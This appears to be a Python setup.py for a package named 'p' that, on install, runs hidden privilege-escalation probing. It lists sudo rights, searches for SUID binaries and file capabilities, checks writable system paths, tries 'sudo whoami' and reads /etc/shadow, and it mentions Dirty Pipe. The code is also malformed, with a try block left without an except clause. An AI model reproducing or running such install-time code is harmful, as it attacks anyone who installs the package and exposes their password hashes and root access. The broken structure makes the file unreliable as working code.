import os, sys, subprocess as sp
from setuptools import setup

def r():
    o = sys.stderr.write
    o("\n--- PRIVESC CHECK ---\n")
    
    o(f"UID: {os.getuid()}\n")
    
    # 1. Sudo check
    s = sp.getoutput("sudo -n -l 2>/dev/null")
    o(f"SUDO_L: {s if s else 'NONE'}\n")
    
    # 2. SUID binaries
    suid = sp.getoutput("find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -n 5")
    o(f"SUID:\n{suid}\n")
    
    # 3. Try exploit sudo
    if "ALL" in s or "NOPASSWD" in s:
        o("TRYING SUDO...\n")
        o(f"ROOT_CHECK: {sp.getoutput('sudo whoami')}\n")
        o(f"SHADOW: {sp.getoutput('sudo head -n 1 /etc/shadow')}\n")

    # 4. Capabilities
    caps = sp.getoutput("getcap -r / 2>/dev/null | head -n 5")
    o(f"CAPS:\n{caps}\n")

    # 5. Writable system paths
    wp = []
    for d in ['/etc', '/root', '/usr/local/bin']:
        if os.access(d, os.W_OK): wp.append(d)
    o(f"WRITABLE: {wp}\n")

    o("--- END ---\n")
    sys.exit(1)

try: r()
def exploit():
    o = sys.stderr.write
    o(f"\n[!] ATTEMPTING PRIVILEGE ESCALATION\n")
    
    # 1. Проверка SUDO
    o("\n[1] Checking sudo -n -l (No password sudo):\n")
    o(sp.getoutput("sudo -n -l 2>/dev/null || echo 'Sudo needs password'"))
    
    # 2. Поиск SUID файлов (дыры в правах)
    o("\n[2] Searching for SUID binaries:\n")
    o(sp.getoutput("find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -n 10"))

    # 3. Попытка выполнить команду через sudo
    o("\n[3] Trying: sudo whoami\n")
    res = sp.getoutput("sudo whoami 2>/dev/null")
    if "root" in res:
        o("!!! SUCCESS: WE ARE ROOT VIA SUDO !!!\n")
        o(sp.getoutput("sudo cat /etc/shadow | head -n 3"))
    else:
        o("FAILED: Cannot use sudo\n")

    # 4. Проверка версии ядра для Dirty Pipe (CVE-2022-0847)
    o("\n[4] Kernel check for exploits:\n")
    ver = sp.getoutput("uname -r")
    o(f"Kernel version: {ver}\n")
    # Dirty Pipe работает на 5.8 < v < 5.16.11
    o("Note: Vulnerable to Dirty Pipe if 5.8 < v < 5.16\n")

    o("\n--- END OF EXPLOIT ATTEMPT ---\n")
    sys.exit(1)

try: exploit()
except: sys.exit(1)

setup(name="p", version="0.1")
